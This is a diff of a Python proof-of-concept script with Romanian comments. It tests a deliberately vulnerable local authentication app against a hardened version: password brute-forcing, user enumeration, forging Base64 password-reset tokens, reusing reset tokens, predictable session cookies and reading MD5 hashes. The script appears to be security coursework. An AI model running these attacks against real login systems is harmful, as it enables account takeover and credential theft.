@@ -1,70 +1,290 @@
-import requests
+import sys
+import hashlib
 import base64
+import sqlite3
+import requests
 
-BASE_URL = "http://127.0.0.1:8000"
+V1_URL  = "http://127.0.0.1:8000"  # URL pentru versiunea vulnerabila (v1)
+V2_URL  = "http://127.0.0.1:8001"  # URL pentru versiunea securizata (v2)
+DB_PATH = "./db/database.db"
 
-def test_user_enumeration(email):
-    print(f"\n[*] Testing Enumeration for {email}...")
+def get_base_url():
+    if len(sys.argv) > 1 and sys.argv[1] == "v2":
+        return V2_URL
+    return V1_URL
+
+def cleanup_db():
+    """Sterge datele de test din rulari anterioare pentru a permite re-rulare curata."""
     try:
-        r = requests.post(f"{BASE_URL}/login", json={"email": email, "password": "wrongpassword123!"})
-        if "Parolă greșită" in r.text or "User inexistent" in r.text:
-            print(f"[!!!] VULNERABIL (v1): Am aflat exact motivul (User Enumeration posibil) -> {r.json()['detail']}")
-        elif r.status_code == 401 and "Invalid credentials" in r.text:
-            print(f"[+] SECURIZAT (v2): Serverul a ascuns motivul real -> {r.json()['detail']}")
-        else:
-            print(f"[-] Răspuns necunoscut: {r.text}")
+        conn = sqlite3.connect(DB_PATH)
+        conn.execute("DELETE FROM reset_tokens")
+        conn.execute("DELETE FROM sessions")
+        conn.execute("DELETE FROM users WHERE email LIKE '%@authx.local'")
+        conn.commit()
+        conn.close()
+        print("[CLEANUP] Datele de test vechi au fost sterse.")
     except Exception as e:
-        print(f"Eroare conexiune: {e}")
+        print(f"[CLEANUP] Avertisment: {e}")
 
-def test_brute_force(email, wordlist):
-    print(f"\n[*] Starting Brute Force against {email}...")
+# =============================================================================
+# 4.1 - Politica parola slaba
+# =============================================================================
+def test_weak_password_policy(base_url):
+    print("\n" + "="*60)
+    print("[4.1] Test: Politica Parola Slaba")
+    print("="*60)
+    weak_passwords = ["a", "123", "abc123", "password"]
+    for pwd in weak_passwords:
+        try:
+            email = f"weaktest_{pwd}@authx.local"
+            r = requests.post(f"{base_url}/register",
+                              json={"email": email, "password": pwd})
+            if r.status_code == 200:
+                print(f"[!!!] VULNERABIL (v1): Parola '{pwd}' a fost ACCEPTATA!")
+            elif r.status_code == 400 and "parol" in r.text.lower():
+                print(f"[+] SECURIZAT (v2): Parola '{pwd}' a fost RESPINSA (politica parola).")
+            else:
+                print(f"    '{pwd}': {r.status_code} - {r.text[:80]}")
+        except Exception as e:
+            print(f"    Eroare: {e}")
+
+# =============================================================================
+# 4.2 - Stocare nesigura a parolelor (MD5 vs bcrypt)
+# =============================================================================
+def test_password_storage():
+    print("\n" + "="*60)
+    print("[4.2] Test: Stocare Nesigura a Parolelor")
+    print("="*60)
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute("SELECT email, password_hash FROM users LIMIT 5")
+        rows = cursor.fetchall()
+        conn.close()
+
+        if not rows:
+            print("Nu exista utilizatori in DB.")
+            return
+
+        for row in rows:
+            h = row['password_hash']
+            if len(h) == 32 and all(c in '0123456789abcdef' for c in h):
+                print(f"[!!!] VULNERABIL (v1): {row['email']} -> hash MD5: {h}")
+                if h == hashlib.md5(b"password").hexdigest():
+                    print(f"      Cracat instant! Parola originala: 'password'")
+            elif h.startswith("$2b$") or h.startswith("$2a$"):
+                print(f"[+] SECURIZAT (v2): {row['email']} -> hash bcrypt: {h[:29]}...")
+            else:
+                print(f"    {row['email']} -> hash: {h[:40]}...")
+    except Exception as e:
+        print(f"    Eroare acces DB: {e}")
+
+# =============================================================================
+# 4.3 - Brute Force / Lipsa rate limiting
+# =============================================================================
+def test_brute_force(base_url, email, wordlist):
+    print("\n" + "="*60)
+    print(f"[4.3] Test: Brute Force impotriva {email}")
+    print("="*60)
     for pwd in wordlist:
         try:
-            r = requests.post(f"{BASE_URL}/login", json={"email": email, "password": pwd})
+            r = requests.post(f"{base_url}/login",
+                              json={"email": email, "password": pwd})
             if r.status_code == 200:
-                print(f"[!!!] VULNERABIL (v1): Am ghicit parola! Parola este: {pwd}")
+                print(f"[!!!] VULNERABIL (v1): Parola gasita: '{pwd}'! Nicio blocare detectata.")
                 return
-            elif r.status_code == 401 and "Cont blocat" in r.text:
-                print(f"[+] SECURIZAT (v2): Serverul m-a blocat după prea multe încercări! (Parola blocată la: {pwd})")
+            elif r.status_code == 429 or "blocat" in r.text.lower():
+                print(f"[+] SECURIZAT (v2): Cont BLOCAT dupa prea multe incercari!")
+                print(f"    Raspuns: {r.json().get('detail', '')}")
                 return
+            else:
+                print(f"    Incercare '{pwd}': {r.status_code}")
         except Exception as e:
-             print(f"Eroare: {e}")
-             return
-    print("[-] Brute force terminat. Nu s-a declanșat nicio protecție, dar parola nu a fost găsită (contul probabil nu există).")
+            print(f"    Eroare: {e}")
+            return
+    print("[-] Brute force terminat fara succes si fara blocare.")
 
-def test_predictable_token(email):
-    print(f"\n[*] Testing Reset Token predictability for {email}...")
-    
-    # 1. Declanșăm procesul de resetare pentru a popula baza de date
-    requests.post(f"{BASE_URL}/request-reset", json={"email": email})
-    
-    # 2. Hackerul calculează tokenul presupunând că e doar Base64 (ca în v1)
-    fake_token = base64.urlsafe_b64encode(email.encode('utf-8')).decode('utf-8').rstrip('=')
-    print(f"    -> Hackerul încearcă tokenul ghicit: {fake_token}")
-    
-    # 3. Hackerul încearcă să reseteze parola
+# =============================================================================
+# 4.4 - User Enumeration
+# =============================================================================
+def test_user_enumeration(base_url, email_existent, email_inexistent):
+    print("\n" + "="*60)
+    print("[4.4] Test: User Enumeration")
+    print("="*60)
+    for email, label in [(email_existent, "EXISTENT"), (email_inexistent, "INEXISTENT")]:
+        try:
+            r = requests.post(f"{base_url}/login",
+                              json={"email": email, "password": "parolaGresita!99"})
+            detail = r.json().get("detail", "")
+            if "inexistent" in detail.lower() or "parol" in detail.lower():
+                print(f"[!!!] VULNERABIL (v1): user {label} ({email}) -> mesaj diferit: '{detail}'")
+            elif "credentiale invalide" in detail.lower() or "invalid" in detail.lower():
+                print(f"[+] SECURIZAT (v2): user {label} ({email}) -> mesaj generic: '{detail}'")
+            else:
+                print(f"    {label}: status={r.status_code}, detail='{detail}'")
+        except Exception as e:
+            print(f"    Eroare: {e}")
+
+# =============================================================================
+# 4.5 - Gestionare nesigura a sesiunilor
+# =============================================================================
+def test_session_security(base_url, email, password):
+    print("\n" + "="*60)
+    print("[4.5] Test: Securitatea Cookie-ului de Sesiune")
+    print("="*60)
     try:
-        r = requests.post(f"{BASE_URL}/reset-password", json={"token": fake_token, "new_password": "HackedPassword123!"})
-        if r.status_code == 200:
-            print("[!!!] VULNERABIL (v1): Serverul a acceptat tokenul Base64! Contul a fost furat!")
-        elif r.status_code == 400 and "Token invalid" in r.text:
-            print("[+] SECURIZAT (v2): Serverul a RESPINS tokenul Base64 (folosește tokenuri sigure)!")
-        else:
-            print(f"[-] Răspuns necunoscut: {r.status_code} - {r.text}")
-    except Exception as e:
-        print(f"Eroare: {e}")
+        s = requests.Session()
+        r = s.post(f"{base_url}/login",
+                   json={"email": email, "password": password})
+        if r.status_code != 200:
+            print(f"    Login esuat: {r.text}")
+            return
 
+        cookie = s.cookies.get("session_id")
+        if not cookie:
+            print("    Cookie 'session_id' nu a fost primit.")
+            return
+
+        print(f"    Cookie session_id: {cookie[:50]}...")
+
+        # Verificam daca token-ul este predictibil (ID numeric = user_id din v1)
+        try:
+            user_id = int(cookie)
+            print(f"[!!!] VULNERABIL (v1): Cookie = ID numeric al utilizatorului ({user_id})!")
+            print(f"      Oricine poate impersona alt user schimband cookie-ul la '2', '3', etc.")
+        except ValueError:
+            print(f"[+] SECURIZAT (v2): Cookie este un token random opac (nu ID numeric).")
+
+        # Verificam atributele cookie din header
+        set_cookie_header = r.headers.get("set-cookie", "")
+        if set_cookie_header:
+            has_httponly = "httponly" in set_cookie_header.lower()
+            has_samesite = "samesite" in set_cookie_header.lower()
+            print(f"    Set-Cookie: {set_cookie_header}")
+            if not has_httponly:
+                print("[!!!] VULNERABIL (v1): Cookie fara HttpOnly -> accesibil din JS (risc XSS)!")
+            else:
+                print("[+] SECURIZAT (v2): Cookie are atribut HttpOnly.")
+            if not has_samesite:
+                print("[!!!] VULNERABIL (v1): Cookie fara SameSite -> risc CSRF!")
+            else:
+                print("[+] SECURIZAT (v2): Cookie are atribut SameSite.")
+    except Exception as e:
+        print(f"    Eroare: {e}")
+
+# =============================================================================
+# 4.6 - Resetare parola nesigura
+# =============================================================================
+def test_predictable_token(base_url, email):
+    print("\n" + "="*60)
+    print(f"[4.6a] Test: Token de resetare predictibil pentru {email}")
+    print("="*60)
+
+    requests.post(f"{base_url}/request-reset", json={"email": email})
+
+    # Atacatorul ghiceste tokenul ca Base64(email) - schema v1
+    fake_token = base64.urlsafe_b64encode(
+        email.encode('utf-8')
+    ).decode('utf-8').rstrip('=')
+    print(f"    Token ghicit (Base64 email): {fake_token}")
+
+    try:
+        r = requests.post(f"{base_url}/reset-password",
+                          json={"token": fake_token, "new_password": "HackedPassword123!"})
+        if r.status_code == 200:
+            print("[!!!] VULNERABIL (v1): Serverul a ACCEPTAT tokenul Base64! Cont preluat!")
+        elif r.status_code == 400:
+            print("[+] SECURIZAT (v2): Serverul a RESPINS tokenul fabricat (token random).")
+        else:
+            print(f"    Raspuns: {r.status_code} - {r.text[:80]}")
+    except Exception as e:
+        print(f"    Eroare: {e}")
+
+
+def test_token_reuse(base_url, email):
+    print(f"\n[4.6b] Test: Token de resetare reutilizabil pentru {email}")
+    try:
+        r = requests.post(f"{base_url}/request-reset", json={"email": email})
+        link = r.json().get("link", "")
+        if not link:
+            print("    Nu s-a putut obtine link-ul de resetare (user inexistent sau server oprit).")
+            return
+        token = link.split("token=")[-1]
+        print(f"    Token obtinut: {token[:30]}...")
+
+        # Prima utilizare
+        r1 = requests.post(f"{base_url}/reset-password",
+                           json={"token": token, "new_password": "NewPass1@first"})
+        if r1.status_code == 200:
+            print("    Prima resetare: REUSITA")
+        else:
+            print(f"    Prima resetare esuata: {r1.text}")
+            return
+
+        # A doua utilizare cu acelasi token
+        r2 = requests.post(f"{base_url}/reset-password",
+                           json={"token": token, "new_password": "HackedPass2@second"})
+        if r2.status_code == 200:
+            print("[!!!] VULNERABIL (v1): Token REUTILIZABIL! A doua resetare a reusit!")
+        elif r2.status_code == 400:
+            print("[+] SECURIZAT (v2): Token one-time! A doua utilizare a fost RESPINSA.")
+        else:
+            print(f"    Raspuns: {r2.status_code} - {r2.text[:80]}")
+    except Exception as e:
+        print(f"    Eroare: {e}")
+
+# =============================================================================
+# Main
+# =============================================================================
 if __name__ == "__main__":
-    print("=== Rulează acest PoC împotriva aplicației ===")
-    
-    # Creează contul țintă (admin) pentru a putea testa cu succes brute force
-    requests.post(f"{BASE_URL}/register", json={"email": "admin@authx.local", "password": "password"})
-    
-    test_user_enumeration("inexistent@authx.local")
-    
-    passwords = ["123456", "12345678", "admin", "authx123", "parola1", "password"]
-    test_brute_force("admin@authx.local", passwords)
-    
-    # Înregistrăm și victima pentru testul de token
-    requests.post(f"{BASE_URL}/register", json={"email": "victim@authx.local", "password": "password"})
-    test_predictable_token("victim@authx.local")
+    base_url = get_base_url()
+    version  = "v2 (SECURIZAT)" if base_url == V2_URL else "v1 (VULNERABIL)"
+    print(f"\n{'#'*60}")
+    print(f"  AuthX PoC - Ruleaza impotriva: {version}")
+    print(f"  URL: {base_url}")
+    print(f"{'#'*60}")
+
+    # Curata datele din rulari anterioare pentru a permite re-rulare corecta
+    cleanup_db()
+
+    # Parola de test compatibila cu versiunea testata
+    target_pwd = "SecurePass1!" if base_url == V2_URL else "password"
+
+    r = requests.post(f"{base_url}/register",
+                      json={"email": "admin@authx.local", "password": target_pwd})
+    print(f"\n[SETUP] Register admin@authx.local -> {r.status_code}: {r.text[:80]}")
+
+    r = requests.post(f"{base_url}/register",
+                      json={"email": "victim@authx.local", "password": target_pwd})
+    print(f"[SETUP] Register victim@authx.local -> {r.status_code}: {r.text[:80]}")
+
+    # Email separat pentru testul de reutilizare token (evita UNIQUE constraint pe v1)
+    r = requests.post(f"{base_url}/register",
+                      json={"email": "tokentest@authx.local", "password": target_pwd})
+    print(f"[SETUP] Register tokentest@authx.local -> {r.status_code}: {r.text[:80]}")
+
+    # Email separat pentru brute force (parola simpla in wordlist pentru v1,
+    # parola complexa nedetectabila pentru v2 -> demonstreaza lockout-ul)
+    r = requests.post(f"{base_url}/register",
+                      json={"email": "bruteforce@authx.local", "password": target_pwd})
+    print(f"[SETUP] Register bruteforce@authx.local -> {r.status_code}: {r.text[:80]}")
+
+    # Rulam toate testele
+    test_weak_password_policy(base_url)
+    test_password_storage()
+
+    common_passwords = ["123456", "12345678", "admin", "authx123",
+                        "parola1", "password"]
+    # Brute force pe contul dedicat (nu pe admin, ca sa nu-l blocam)
+    test_brute_force(base_url, "bruteforce@authx.local", common_passwords)
+
+    test_user_enumeration(base_url, "admin@authx.local", "inexistent@authx.local")
+    test_session_security(base_url, "admin@authx.local", target_pwd)
+    test_predictable_token(base_url, "victim@authx.local")
+    # Folosim email diferit pentru reuse test ca sa evitam UNIQUE constraint pe v1
+    test_token_reuse(base_url, "tokentest@authx.local")
+
+    print(f"\n{'#'*60}")
+    print("  PoC incheiat.")
+    print(f"{'#'*60}\n")
